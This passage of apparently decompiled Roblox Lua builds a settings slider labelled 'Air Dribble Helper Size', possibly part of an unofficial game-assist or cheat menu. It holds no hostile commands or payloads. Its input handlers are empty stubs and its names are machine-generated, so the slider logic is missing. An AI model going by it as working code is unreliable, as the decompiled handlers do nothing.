    TweenService:Create(ImageLabel_22, r1036(0), {
        ["ImageTransparency"] = 0
    }):Play();
    r1040:Play();
end);
local Frame_92 = Instance.new"Frame";
Frame_92.Size = UDim2_New(1, 0, 0, 42);
Frame_92.BackgroundTransparency = 1;
Frame_92.LayoutOrder = 2;
Frame_92.Parent = Frame_90;
local Air_Dribble_Helper_Size = Instance.new"TextLabel";
Air_Dribble_Helper_Size.Size = UDim2_New(1, -40, 0, 18);
Air_Dribble_Helper_Size.Position = UDim2_New(0, 0, 0, 2);
Air_Dribble_Helper_Size.BackgroundTransparency = 1;
Air_Dribble_Helper_Size.Text = "Air Dribble Helper Size";
Air_Dribble_Helper_Size.TextColor3 = R294_Result_6;
Air_Dribble_Helper_Size.Font = Enum.Font.GothamBold;
Air_Dribble_Helper_Size.TextSize = 12;
Air_Dribble_Helper_Size.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
Air_Dribble_Helper_Size.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Center;
Air_Dribble_Helper_Size.TextYAlignment = Enum.TextYAlignment.Center;
Air_Dribble_Helper_Size.Parent = Frame_92;
local TextLabel_9 = Instance.new"TextLabel";
TextLabel_9.Size = UDim2_New(0, 40, 0, 18);
TextLabel_9.Position = UDim2_New(1, -40, 0, 2);
TextLabel_9.BackgroundTransparency = 1;
TextLabel_9.Text = "0";
TextLabel_9.TextColor3 = R294_Result_7;
TextLabel_9.Font = Enum.Font.GothamBold;
TextLabel_9.TextSize = 11;
local _ = Enum.TextXAlignment.Right;
TextLabel_9.TextXAlignment = Enum.TextXAlignment.Right;
local _ = Enum.TextYAlignment.Center;
TextLabel_9.TextYAlignment = Enum.TextYAlignment.Center;
TextLabel_9.Parent = Frame_92;
local Frame_93 = Instance.new"Frame";
Frame_93.Size = UDim2_New(1, 0, 0, 6);
Frame_93.Position = UDim2_New(0, 0, 0, 24);
Frame_93.BackgroundColor3 = FromRGB(22, 22, 26);
Frame_93.Parent = Frame_92;
r3521 = Instance.new("UICorner", Frame_93);
r3521.CornerRadius = UDim_New(1, 0);
local Frame_94 = Instance.new"Frame";
Frame_94.Size = UDim2_New(0, 0, 1, 0);
Frame_94.BackgroundColor3 = R294_Result_5;
Frame_94.Parent = Frame_93;
r3527 = Instance.new("UICorner", Frame_94);
r3527.CornerRadius = UDim_New(1, 0);
local Frame_95 = Instance.new"Frame";
Frame_95.Size = UDim2_New(0, 10, 0, 16);
Frame_95.AnchorPoint = r1340(0.5, 0.5);
Frame_95.Position = UDim2_New(1, 0, 0.5, 0);
Frame_95.BackgroundColor3 = FromRGB(255, 255, 255);
Frame_95.Parent = Frame_94;
r3539 = Instance.new("UICorner", Frame_95);
r3539.CornerRadius = UDim_New(0, 4);
Frame_93.InputBegan:Connect(function(input_6, a_135, b_135, c_135)
    local _ = Enum.UserInputType.MouseButton1;
    local _ = Enum.UserInputType.Touch;
end);
UserInputService.InputEnded:Connect(function(input_7, a_136, b_136, c_136)
    local _ = Enum.UserInputType.MouseButton1;
    local _ = Enum.UserInputType.Touch;
end);
InputChanged:Connect(function(input_8, a_137, b_137, c_137) end);
